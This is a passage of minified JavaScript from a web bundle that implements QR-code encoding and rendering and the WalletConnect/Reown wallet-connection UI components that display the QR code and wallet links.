Sl(t){this.mode=dK.NUMERIC,this.data=t.toString()}Sl.getBitsLength=function(t){return 10*Math.floor(t/3)+(t%3?t%3*3+1:0)},Sl.prototype.getLength=function(){return this.data.length},Sl.prototype.getBitsLength=function(){return Sl.getBitsLength(this.data.length)},Sl.prototype.write=function(t){let e,r,n;for(e=0;e+3<=this.data.length;e+=3)r=this.data.substr(e,3),n=parseInt(r,10),t.put(n,10);const i=this.data.length-e;i>0&&(r=this.data.substr(e),n=parseInt(r,10),t.put(n,i*3+1))};var fK=Sl;const pK=Ho,nm=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function Nl(t){this.mode=pK.ALPHANUMERIC,this.data=t}Nl.getBitsLength=function(t){return 11*Math.floor(t/2)+6*(t%2)},Nl.prototype.getLength=function(){return this.data.length},Nl.prototype.getBitsLength=function(){return Nl.getBitsLength(this.data.length)},Nl.prototype.write=function(t){let e;for(e=0;e+2<=this.data.length;e+=2){let r=nm.indexOf(this.data[e])*45;r+=nm.indexOf(this.data[e+1]),t.put(r,11)}this.data.length%2&&t.put(nm.indexOf(this.data[e]),6)};var gK=Nl,wK=function(t){for(var e=[],r=t.length,n=0;n<r;n++){var i=t.charCodeAt(n);if(i>=55296&&i<=56319&&r>n+1){var s=t.charCodeAt(n+1);s>=56320&&s<=57343&&(i=(i-55296)*1024+s-56320+65536,n+=1)}if(i<128){e.push(i);continue}if(i<2048){e.push(i>>6|192),e.push(i&63|128);continue}if(i<55296||i>=57344&&i<65536){e.push(i>>12|224),e.push(i>>6&63|128),e.push(i&63|128);continue}if(i>=65536&&i<=1114111){e.push(i>>18|240),e.push(i>>12&63|128),e.push(i>>6&63|128),e.push(i&63|128);continue}e.push(239,191,189)}return new Uint8Array(e).buffer};const mK=wK,yK=Ho;function Pl(t){this.mode=yK.BYTE,typeof t=="string"&&(t=mK(t)),this.data=new Uint8Array(t)}Pl.getBitsLength=function(t){return t*8},Pl.prototype.getLength=function(){return this.data.length},Pl.prototype.getBitsLength=function(){return Pl.getBitsLength(this.data.length)},Pl.prototype.write=function(t){for(let e=0,r=this.data.length;e<r;e++)t.put(this.data[e],8)};var bK=Pl;const vK=Ho,EK=pn;function kl(t){this.mode=vK.KANJI,this.data=t}kl.getBitsLength=function(t){return t*13},kl.prototype.getLength=function(){return this.data.length},kl.prototype.getBitsLength=function(){return kl.getBitsLength(this.data.length)},kl.prototype.write=function(t){let e;for(e=0;e<this.data.length;e++){let r=EK.toSJIS(this.data[e]);if(r>=33088&&r<=40956)r-=33088;else if(r>=57408&&r<=60351)r-=49472;else throw new Error("Invalid SJIS character: "+this.data[e]+`
Make sure your charset is UTF-8`);r=(r>>>8&255)*192+(r&255),t.put(r,13)}};var CK=kl,y8={exports:{}};(function(t){var e={single_source_shortest_paths:function(r,n,i){var s={},o={};o[n]=0;var a=e.PriorityQueue.make();a.push(n,0);for(var c,l,u,h,d,f,g,p,w;!a.empty();){c=a.pop(),l=c.value,h=c.cost,d=r[l]||{};for(u in d)d.hasOwnProperty(u)&&(f=d[u],g=h+f,p=o[u],w=typeof o[u]>"u",(w||p>g)&&(o[u]=g,a.push(u,g),s[u]=l))}if(typeof i<"u"&&typeof o[i]>"u"){var m=["Could not find a path from ",n," to ",i,"."].join("");throw new Error(m)}return s},extract_shortest_path_from_predecessor_list:function(r,n){for(var i=[],s=n;s;)i.push(s),r[s],s=r[s];return i.reverse(),i},find_path:function(r,n,i){var s=e.single_source_shortest_paths(r,n,i);return e.extract_shortest_path_from_predecessor_list(s,i)},PriorityQueue:{make:function(r){var n=e.PriorityQueue,i={},s;r=r||{};for(s in n)n.hasOwnProperty(s)&&(i[s]=n[s]);return i.queue=[],i.sorter=r.sorter||n.default_sorter,i},default_sorter:function(r,n){return r.cost-n.cost},push:function(r,n){var i={value:r,cost:n};this.queue.push(i),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return this.queue.length===0}}};t.exports=e})(y8),function(t){const e=Ho,r=fK,n=gK,i=bK,s=CK,o=ji,a=pn,c=y8.exports;function l(m){return unescape(encodeURIComponent(m)).length}function u(m,b,v){const x=[];let I;for(;(I=m.exec(v))!==null;)x.push({data:I[0],index:I.index,mode:b,length:I[0].length});return x}function h(m){const b=u(o.NUMERIC,e.NUMERIC,m),v=u(o.ALPHANUMERIC,e.ALPHANUMERIC,m);let x,I;return a.isKanjiModeEnabled()?(x=u(o.BYTE,e.BYTE,m),I=u(o.KANJI,e.KANJI,m)):(x=u(o.BYTE_KANJI,e.BYTE,m),I=[]),b.concat(v,x,I).sort(function(C,N){return C.index-N.index}).map(function(C){return{data:C.data,mode:C.mode,length:C.length}})}function d(m,b){switch(b){case e.NUMERIC:return r.getBitsLength(m);case e.ALPHANUMERIC:return n.getBitsLength(m);case e.KANJI:return s.getBitsLength(m);case e.BYTE:return i.getBitsLength(m)}}function f(m){return m.reduce(function(b,v){const x=b.length-1>=0?b[b.length-1]:null;return x&&x.mode===v.mode?(b[b.length-1].data+=v.data,b):(b.push(v),b)},[])}function g(m){const b=[];for(let v=0;v<m.length;v++){const x=m[v];switch(x.mode){case e.NUMERIC:b.push([x,{data:x.data,mode:e.ALPHANUMERIC,length:x.length},{data:x.data,mode:e.BYTE,length:x.length}]);break;case e.ALPHANUMERIC:b.push([x,{data:x.data,mode:e.BYTE,length:x.length}]);break;case e.KANJI:b.push([x,{data:x.data,mode:e.BYTE,length:l(x.data)}]);break;case e.BYTE:b.push([{data:x.data,mode:e.BYTE,length:l(x.data)}])}}return b}function p(m,b){const v={},x={start:{}};let I=["start"];for(let C=0;C<m.length;C++){const N=m[C],S=[];for(let P=0;P<N.length;P++){const T=N[P],D=""+C+P;S.push(D),v[D]={node:T,lastCount:0},x[D]={};for(let z=0;z<I.length;z++){const V=I[z];v[V]&&v[V].node.mode===T.mode?(x[V][D]=d(v[V].lastCount+T.length,T.mode)-d(v[V].lastCount,T.mode),v[V].lastCount+=T.length):(v[V]&&(v[V].lastCount=T.length),x[V][D]=d(T.length,T.mode)+4+e.getCharCountIndicator(T.mode,b))}}I=S}for(let C=0;C<I.length;C++)x[I[C]].end=0;return{map:x,table:v}}function w(m,b){let v;const x=e.getBestModeForData(m);if(v=e.from(b,x),v!==e.BYTE&&v.bit<x.bit)throw new Error('"'+m+'" cannot be encoded with mode '+e.toString(v)+`.
 Suggested mode is: `+e.toString(x));switch(v===e.KANJI&&!a.isKanjiModeEnabled()&&(v=e.BYTE),v){case e.NUMERIC:return new r(m);case e.ALPHANUMERIC:return new n(m);case e.KANJI:return new s(m);case e.BYTE:return new i(m)}}t.fromArray=function(m){return m.reduce(function(b,v){return typeof v=="string"?b.push(w(v,null)):v.data&&b.push(w(v.data,v.mode)),b},[])},t.fromString=function(m,b){const v=h(m,a.isKanjiModeEnabled()),x=g(v),I=p(x,b),C=c.find_path(I.map,"start","end"),N=[];for(let S=1;S<C.length-1;S++)N.push(I.table[C[S]].node);return t.fromArray(f(N))},t.rawSplit=function(m){return t.fromArray(h(m,a.isKanjiModeEnabled()))}}(W9);const g1=pn,im=p1,AK=rK,xK=nK,IK=U9,SK=M9,jy=F9,Hy=wg,NK=sK,mg=j9,PK=q9,kK=Ho,sm=W9;function OK(t,e){const r=t.size,n=SK.getPositions(e);for(let i=0;i<n.length;i++){const s=n[i][0],o=n[i][1];for(let a=-1;a<=7;a++)if(!(s+a<=-1||r<=s+a))for(let c=-1;c<=7;c++)o+c<=-1||r<=o+c||(a>=0&&a<=6&&(c===0||c===6)||c>=0&&c<=6&&(a===0||a===6)||a>=2&&a<=4&&c>=2&&c<=4?t.set(s+a,o+c,!0,!0):t.set(s+a,o+c,!1,!0))}}function _K(t){const e=t.size;for(let r=8;r<e-8;r++){const n=r%2===0;t.set(r,6,n,!0),t.set(6,r,n,!0)}}function TK(t,e){const r=IK.getPositions(e);for(let n=0;n<r.length;n++){const i=r[n][0],s=r[n][1];for(let o=-2;o<=2;o++)for(let a=-2;a<=2;a++)o===-2||o===2||a===-2||a===2||o===0&&a===0?t.set(i+o,s+a,!0,!0):t.set(i+o,s+a,!1,!0)}}function $K(t,e){const r=t.size,n=mg.getEncodedBits(e);let i,s,o;for(let a=0;a<18;a++)i=Math.floor(a/3),s=a%3+r-8-3,o=(n>>a&1)===1,t.set(i,s,o,!0),t.set(s,i,o,!0)}function om(t,e,r){const n=t.size,i=PK.getEncodedBits(e,r);let s,o;for(s=0;s<15;s++)o=(i>>s&1)===1,s<6?t.set(s,8,o,!0):s<8?t.set(s+1,8,o,!0):t.set(n-15+s,8,o,!0),s<8?t.set(8,n-s-1,o,!0):s<9?t.set(8,15-s-1+1,o,!0):t.set(8,15-s-1,o,!0);t.set(n-8,8,1,!0)}function RK(t,e){const r=t.size;let n=-1,i=r-1,s=7,o=0;for(let a=r-1;a>0;a-=2)for(a===6&&a--;;){for(let c=0;c<2;c++)if(!t.isReserved(i,a-c)){let l=!1;o<e.length&&(l=(e[o]>>>s&1)===1),t.set(i,a-c,l),s--,s===-1&&(o++,s=7)}if(i+=n,i<0||r<=i){i-=n,n=-n;break}}}function DK(t,e,r){const n=new AK;r.forEach(function(c){n.put(c.mode.bit,4),n.put(c.getLength(),kK.getCharCountIndicator(c.mode,t)),c.write(n)});const i=g1.getSymbolTotalCodewords(t),s=Hy.getTotalCodewordsCount(t,e),o=(i-s)*8;for(n.getLengthInBits()+4<=o&&n.put(0,4);n.getLengthInBits()%8!==0;)n.putBit(0);const a=(o-n.getLengthInBits())/8;for(let c=0;c<a;c++)n.put(c%2?17:236,8);return BK(n,t,e)}function BK(t,e,r){const n=g1.getSymbolTotalCodewords(e),i=Hy.getTotalCodewordsCount(e,r),s=n-i,o=Hy.getBlocksCount(e,r),a=n%o,c=o-a,l=Math.floor(n/o),u=Math.floor(s/o),h=u+1,d=l-u,f=new NK(d);let g=0;const p=new Array(o),w=new Array(o);let m=0;const b=new Uint8Array(t.buffer);for(let N=0;N<o;N++){const S=N<c?u:h;p[N]=b.slice(g,g+S),w[N]=f.encode(p[N]),g+=S,m=Math.max(m,S)}const v=new Uint8Array(n);let x=0,I,C;for(I=0;I<m;I++)for(C=0;C<o;C++)I<p[C].length&&(v[x++]=p[C][I]);for(I=0;I<d;I++)for(C=0;C<o;C++)v[x++]=w[C][I];return v}function LK(t,e,r,n){let i;if(Array.isArray(t))i=sm.fromArray(t);else if(typeof t=="string"){let l=e;if(!l){const u=sm.rawSplit(t);l=mg.getBestVersionForData(u,r)}i=sm.fromString(t,l||40)}else throw new Error("Invalid data");const s=mg.getBestVersionForData(i,r);if(!s)throw new Error("The amount of data is too big to be stored in a QR Code");if(!e)e=s;else if(e<s)throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: `+s+`.
`);const o=DK(e,r,i),a=g1.getSymbolSize(e),c=new xK(a);return OK(c,e),_K(c),TK(c,e),om(c,r,0),e>=7&&$K(c,e),RK(c,o),isNaN(n)&&(n=jy.getBestMask(c,om.bind(null,c,r))),jy.applyMask(n,c),om(c,r,n),{modules:c,version:e,errorCorrectionLevel:r,maskPattern:n,segments:i}}B9.create=function(t,e){if(typeof t>"u"||t==="")throw new Error("No input text");let r=im.M,n,i;return typeof e<"u"&&(r=im.from(e.errorCorrectionLevel,im.M),n=mg.from(e.version),i=jy.from(e.maskPattern),e.toSJISFunc&&g1.setToSJISFunction(e.toSJISFunc)),LK(t,n,r,i)};var G9={},qy={};(function(t){function e(r){if(typeof r=="number"&&(r=r.toString()),typeof r!="string")throw new Error("Color should be defined as hex string");let n=r.slice().replace("#","").split("");if(n.length<3||n.length===5||n.length>8)throw new Error("Invalid hex color: "+r);(n.length===3||n.length===4)&&(n=Array.prototype.concat.apply([],n.map(function(s){return[s,s]}))),n.length===6&&n.push("F","F");const i=parseInt(n.join(""),16);return{r:i>>24&255,g:i>>16&255,b:i>>8&255,a:i&255,hex:"#"+n.slice(0,6).join("")}}t.getOptions=function(r){r||(r={}),r.color||(r.color={});const n=typeof r.margin>"u"||r.margin===null||r.margin<0?4:r.margin,i=r.width&&r.width>=21?r.width:void 0,s=r.scale||4;return{width:i,scale:i?4:s,margin:n,color:{dark:e(r.color.dark||"#000000ff"),light:e(r.color.light||"#ffffffff")},type:r.type,rendererOpts:r.rendererOpts||{}}},t.getScale=function(r,n){return n.width&&n.width>=r+n.margin*2?n.width/(r+n.margin*2):n.scale},t.getImageWidth=function(r,n){const i=t.getScale(r,n);return Math.floor((r+n.margin*2)*i)},t.qrToImageData=function(r,n,i){const s=n.modules.size,o=n.modules.data,a=t.getScale(s,i),c=Math.floor((s+i.margin*2)*a),l=i.margin*a,u=[i.color.light,i.color.dark];for(let h=0;h<c;h++)for(let d=0;d<c;d++){let f=(h*c+d)*4,g=i.color.light;if(h>=l&&d>=l&&h<c-l&&d<c-l){const p=Math.floor((h-l)/a),w=Math.floor((d-l)/a);g=u[o[p*s+w]?1:0]}r[f++]=g.r,r[f++]=g.g,r[f++]=g.b,r[f]=g.a}}})(qy),function(t){const e=qy;function r(i,s,o){i.clearRect(0,0,s.width,s.height),s.style||(s.style={}),s.height=o,s.width=o,s.style.height=o+"px",s.style.width=o+"px"}function n(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}t.render=function(i,s,o){let a=o,c=s;typeof a>"u"&&(!s||!s.getContext)&&(a=s,s=void 0),s||(c=n()),a=e.getOptions(a);const l=e.getImageWidth(i.modules.size,a),u=c.getContext("2d"),h=u.createImageData(l,l);return e.qrToImageData(h.data,i,a),r(u,c,l),u.putImageData(h,0,0),c},t.renderToDataURL=function(i,s,o){let a=o;typeof a>"u"&&(!s||!s.getContext)&&(a=s,s=void 0),a||(a={});const c=t.render(i,s,a),l=a.type||"image/png",u=a.rendererOpts||{};return c.toDataURL(l,u.quality)}}(G9);var K9={};const UK=qy;function b8(t,e){const r=t.a/255,n=e+'="'+t.hex+'"';return r<1?n+" "+e+'-opacity="'+r.toFixed(2).slice(1)+'"':n}function am(t,e,r){let n=t+e;return typeof r<"u"&&(n+=" "+r),n}function MK(t,e,r){let n="",i=0,s=!1,o=0;for(let a=0;a<t.length;a++){const c=Math.floor(a%e),l=Math.floor(a/e);!c&&!s&&(s=!0),t[a]?(o++,a>0&&c>0&&t[a-1]||(n+=s?am("M",c+r,.5+l+r):am("m",i,0),i=0,s=!1),c+1<e&&t[a+1]||(n+=am("h",o),o=0)):i++}return n}K9.render=function(t,e,r){const n=UK.getOptions(e),i=t.modules.size,s=t.modules.data,o=i+n.margin*2,a=n.color.light.a?"<path "+b8(n.color.light,"fill")+' d="M0 0h'+o+"v"+o+'H0z"/>':"",c="<path "+b8(n.color.dark,"stroke")+' d="'+MK(s,i,n.margin)+'"/>',l='viewBox="0 0 '+o+" "+o+'"',u='<svg xmlns="http://www.w3.org/2000/svg" '+(n.width?'width="'+n.width+'" height="'+n.width+'" ':"")+l+' shape-rendering="crispEdges">'+a+c+`</svg>
`;return typeof r=="function"&&r(null,u),u};const FK=eK,Vy=B9,v8=G9,zK=K9;function cm(t,e,r,n,i){const s=[].slice.call(arguments,1),o=s.length,a=typeof s[o-1]=="function";if(!a&&!FK())throw new Error("Callback required as last argument");if(a){if(o<2)throw new Error("Too few arguments provided");o===2?(i=r,r=e,e=n=void 0):o===3&&(e.getContext&&typeof i>"u"?(i=n,n=void 0):(i=n,n=r,r=e,e=void 0))}else{if(o<1)throw new Error("Too few arguments provided");return o===1?(r=e,e=n=void 0):o===2&&!e.getContext&&(n=r,r=e,e=void 0),new Promise(function(c,l){try{const u=Vy.create(r,n);c(t(u,e,n))}catch(u){l(u)}})}try{const c=Vy.create(r,n);i(null,t(c,e,n))}catch(c){i(c)}}hd.create=Vy.create,hd.toCanvas=cm.bind(null,v8.render),hd.toDataURL=cm.bind(null,v8.renderToDataURL),hd.toString=cm.bind(null,function(t,e,r){return zK.render(t,r)});const jK=.1,E8=2.5,ls=7;function lm(t,e,r){return t===e?!1:(t-e<0?e-t:t-e)<=r+jK}function HK(t,e){const r=Array.prototype.slice.call(hd.create(t,{errorCorrectionLevel:e}).modules.data,0),n=Math.sqrt(r.length);return r.reduce((i,s,o)=>(o%n===0?i.push([s]):i[i.length-1].push(s))&&i,[])}const qK={generate({uri:t,size:e,logoSize:r,dotColor:n="#141414"}){const i="transparent",s=[],o=HK(t,"Q"),a=e/o.length,c=[{x:0,y:0},{x:1,y:0},{x:0,y:1}];c.forEach(({x:g,y:p})=>{const w=(o.length-ls)*a*g,m=(o.length-ls)*a*p,b=.45;for(let v=0;v<c.length;v+=1){const x=a*(ls-v*2);s.push(re`
            <rect
              fill=${v===2?n:i}
              width=${v===0?x-5:x}
              rx= ${v===0?(x-5)*b:x*b}
              ry= ${v===0?(x-5)*b:x*b}
              stroke=${n}
              stroke-width=${v===0?5:0}
              height=${v===0?x-5:x}
              x= ${v===0?m+a*v+5/2:m+a*v}
              y= ${v===0?w+a*v+5/2:w+a*v}
            />
          `)}});const l=Math.floor((r+25)/a),u=o.length/2-l/2,h=o.length/2+l/2-1,d=[];o.forEach((g,p)=>{g.forEach((w,m)=>{if(o[p][m]&&!(p<ls&&m<ls||p>o.length-(ls+1)&&m<ls||p<ls&&m>o.length-(ls+1))&&!(p>u&&p<h&&m>u&&m<h)){const b=p*a+a/2,v=m*a+a/2;d.push([b,v])}})});const f={};return d.forEach(([g,p])=>{var w;f[g]?(w=f[g])==null||w.push(p):f[g]=[p]}),Object.entries(f).map(([g,p])=>{const w=p.filter(m=>p.every(b=>!lm(m,b,a)));return[Number(g),w]}).forEach(([g,p])=>{p.forEach(w=>{s.push(re`<circle cx=${g} cy=${w} fill=${n} r=${a/E8} />`)})}),Object.entries(f).filter(([g,p])=>p.length>1).map(([g,p])=>{const w=p.filter(m=>p.some(b=>lm(m,b,a)));return[Number(g),w]}).map(([g,p])=>{p.sort((m,b)=>m<b?-1:1);const w=[];for(const m of p){const b=w.find(v=>v.some(x=>lm(m,x,a)));b?b.push(m):w.push([m])}return[g,w.map(m=>[m[0],m[m.length-1]])]}).forEach(([g,p])=>{p.forEach(([w,m])=>{s.push(re`
              <line
                x1=${g}
                x2=${g}
                y1=${w}
                y2=${m}
                stroke=${n}
                stroke-width=${a/(E8/2)}
                stroke-linecap="round"
              />
            `)})}),s}};var VK=Ae`
  :host {
    position: relative;
    user-select: none;
    display: block;
    overflow: hidden;
    aspect-ratio: 1 / 1;
    width: var(--local-size);
  }

  :host([data-theme='dark']) {
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px);
    background-color: var(--wui-color-inverse-100);
    padding: var(--wui-spacing-l);
  }

  :host([data-theme='light']) {
    box-shadow: 0 0 0 1px var(--wui-color-bg-125);
    background-color: var(--wui-color-bg-125);
  }

  :host([data-clear='true']) > wui-icon {
    display: none;
  }

  svg:first-child,
  wui-image,
  wui-icon {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translateY(-50%) translateX(-50%);
  }

  wui-image {
    width: 25%;
    height: 25%;
    border-radius: var(--wui-border-radius-xs);
  }

  wui-icon {
    width: 100%;
    height: 100%;
    color: var(--local-icon-color) !important;
    transform: translateY(-50%) translateX(-50%) scale(0.25);
  }
`,us=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const WK="#3396ff";let Qn=class extends fe{constructor(){super(...arguments),this.uri="",this.size=0,this.theme="dark",this.imageSrc=void 0,this.alt=void 0,this.arenaClear=void 0,this.farcaster=void 0}render(){return this.dataset.theme=this.theme,this.dataset.clear=String(this.arenaClear),this.style.cssText=`
     --local-size: ${this.size}px;
     --local-icon-color: ${this.color??WK}
    `,U`${this.templateVisual()} ${this.templateSvg()}`}templateSvg(){const t=this.theme==="light"?this.size:this.size-32;return re`
      <svg height=${t} width=${t}>
        ${qK.generate({uri:this.uri,size:t,logoSize:this.arenaClear?0:t/4,dotColor:this.color})}
      </svg>
    `}templateVisual(){return this.imageSrc?U`<wui-image src=${this.imageSrc} alt=${this.alt??"logo"}></wui-image>`:this.farcaster?U`<wui-icon
        class="farcaster"
        size="inherit"
        color="inherit"
        name="farcaster"
      ></wui-icon>`:U`<wui-icon size="inherit" color="inherit" name="walletConnect"></wui-icon>`}};Qn.styles=[Qe,VK],us([F()],Qn.prototype,"uri",void 0),us([F({type:Number})],Qn.prototype,"size",void 0),us([F()],Qn.prototype,"theme",void 0),us([F()],Qn.prototype,"imageSrc",void 0),us([F()],Qn.prototype,"alt",void 0),us([F()],Qn.prototype,"color",void 0),us([F({type:Boolean})],Qn.prototype,"arenaClear",void 0),us([F({type:Boolean})],Qn.prototype,"farcaster",void 0),Qn=us([he("wui-qr-code")],Qn);var GK=Ae`
  :host {
    display: block;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
    background: linear-gradient(
      120deg,
      var(--wui-color-bg-200) 5%,
      var(--wui-color-bg-200) 48%,
      var(--wui-color-bg-300) 55%,
      var(--wui-color-bg-300) 60%,
      var(--wui-color-bg-300) calc(60% + 10px),
      var(--wui-color-bg-200) calc(60% + 12px),
      var(--wui-color-bg-200) 100%
    );
    background-size: 250%;
    animation: shimmer 3s linear infinite reverse;
  }

  :host([variant='light']) {
    background: linear-gradient(
      120deg,
      var(--wui-color-bg-150) 5%,
      var(--wui-color-bg-150) 48%,
      var(--wui-color-bg-200) 55%,
      var(--wui-color-bg-200) 60%,
      var(--wui-color-bg-200) calc(60% + 10px),
      var(--wui-color-bg-150) calc(60% + 12px),
      var(--wui-color-bg-150) 100%
    );
    background-size: 250%;
  }

  @keyframes shimmer {
    from {
      background-position: -250% 0;
    }
    to {
      background-position: 250% 0;
    }
  }
`,Kh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let ca=class extends fe{constructor(){super(...arguments),this.width="",this.height="",this.borderRadius="m",this.variant="default"}render(){return this.style.cssText=`
      width: ${this.width};
      height: ${this.height};
      border-radius: ${`clamp(0px,var(--wui-border-radius-${this.borderRadius}), 40px)`};
    `,U`<slot></slot>`}};ca.styles=[GK],Kh([F()],ca.prototype,"width",void 0),Kh([F()],ca.prototype,"height",void 0),Kh([F()],ca.prototype,"borderRadius",void 0),Kh([F()],ca.prototype,"variant",void 0),ca=Kh([he("wui-shimmer")],ca);var KK=Ae`
  .reown-logo {
    height: var(--wui-spacing-xxl);
  }
`,ZK=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let um=class extends fe{render(){return U`
      <wui-flex
        justifyContent="center"
        alignItems="center"
        gap="xs"
        .padding=${["0","0","l","0"]}
      >
        <wui-text variant="small-500" color="fg-100"> UX by </wui-text>
        <wui-icon name="reown" size="xxxl" class="reown-logo"></wui-icon>
      </wui-flex>
    `}};um.styles=[Qe,hr,KK],um=ZK([he("wui-ux-by-reown")],um);var JK=Ae`
  @keyframes fadein {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  wui-shimmer {
    width: 100%;
    aspect-ratio: 1 / 1;
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px) !important;
  }

  wui-qr-code {
    opacity: 0;
    animation-duration: 200ms;
    animation-timing-function: ease;
    animation-name: fadein;
    animation-fill-mode: forwards;
  }
`,QK=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let hm=class extends nr{constructor(){var t;super(),this.forceUpdate=()=>{this.requestUpdate()},window.addEventListener("resize",this.forceUpdate),De.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:((t=this.wallet)==null?void 0:t.name)??"WalletConnect",platform:"qrcode"}})}disconnectedCallback(){var t;super.disconnectedCallback(),(t=this.unsubscribe)==null||t.forEach(e=>e()),window.removeEventListener("resize",this.forceUpdate)}render(){return this.onRenderProxy(),U`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["0","xl","xl","xl"]}
        gap="xl"
      >
        <wui-shimmer borderRadius="l" width="100%"> ${this.qrCodeTemplate()} </wui-shimmer>

        <wui-text variant="paragraph-500" color="fg-100">
          Scan this QR Code with your phone
        </wui-text>
        ${this.copyTemplate()}
      </wui-flex>
      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onRenderProxy(){!this.ready&&this.uri&&(this.timeout=setTimeout(()=>{this.ready=!0},200))}qrCodeTemplate(){if(!this.uri||!this.ready)return null;const t=this.getBoundingClientRect().width-40,e=this.wallet?this.wallet.name:void 0;return we.setWcLinking(void 0),we.setRecentWallet(this.wallet),U` <wui-qr-code
      size=${t}
      theme=${Bt.state.themeMode}
      uri=${this.uri}
      imageSrc=${Ee(Mt.getWalletImage(this.wallet))}
      color=${Ee(Bt.state.themeVariables["--w3m-qr-color"])}
      alt=${Ee(e)}
      data-testid="wui-qr-code"
    ></wui-qr-code>`}copyTemplate(){const t=!this.uri||!this.ready;return U`<wui-link
      .disabled=${t}
      @click=${this.onCopyUri}
      color="fg-200"
      data-testid="copy-wc2-uri"
    >
      <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
      Copy link
    </wui-link>`}};hm.styles=JK,hm=QK([he("w3m-connecting-wc-qrcode")],hm);var YK=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let C8=class extends fe{constructor(){var t;if(super(),this.wallet=(t=se.state.data)==null?void 0:t.wallet,!this.wallet)throw new Error("w3m-connecting-wc-unsupported: No wallet provided");De.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}render(){return U`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-wallet-image
          size="lg"
          imageSrc=${Ee(Mt.getWalletImage(this.wallet))}
        ></wui-wallet-image>

        <wui-text variant="paragraph-500" color="fg-100">Not Detected</wui-text>
      </wui-flex>

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}};C8=YK([he("w3m-connecting-wc-unsupported")],C8);var A8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let dm=class extends nr{constructor(){if(super(),this.isLoading=!0,!this.wallet)throw new Error("w3m-connecting-wc-web: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.secondaryBtnLabel="Open",this.secondaryLabel="Open and continue in a new browser tab",this.secondaryBtnIcon="externalLink",this.updateLoadingState(),this.unsubscribe.push(we.subscribeKey("wcUri",()=>{this.updateLoadingState()})),De.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"web"}})}updateLoadingState(){this.isLoading=!this.uri}onConnectProxy(){var t;if((t=this.wallet)!=null&&t.webapp_link&&this.uri)try{this.error=!1;const{webapp_link:e,name:r}=this.wallet,{redirect:n,href:i}=te.formatUniversalUrl(e,this.uri);we.setWcLinking({name:r,href:i}),we.setRecentWallet(this.wallet),te.openHref(n,"_blank")}catch{this.error=!0}}};A8([le()],dm.prototype,"isLoading",void 0),dm=A8([he("w3m-connecting-wc-web")],dm);var u0=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Zh=class extends fe{constructor(){var t;super(),this.wallet=(t=se.state.data)==null?void 0:t.wallet,this.platform=void 0,this.platforms=[],this.isSiwxEnabled=!!Y.state.siwx,this.determinePlatforms(),this.initializeConnection()}render(){return U`
      ${this.headerTemplate()}
      <div>${this.platformTemplate()}</div>
      <wui-ux-by-reown></wui-ux-by-reown>
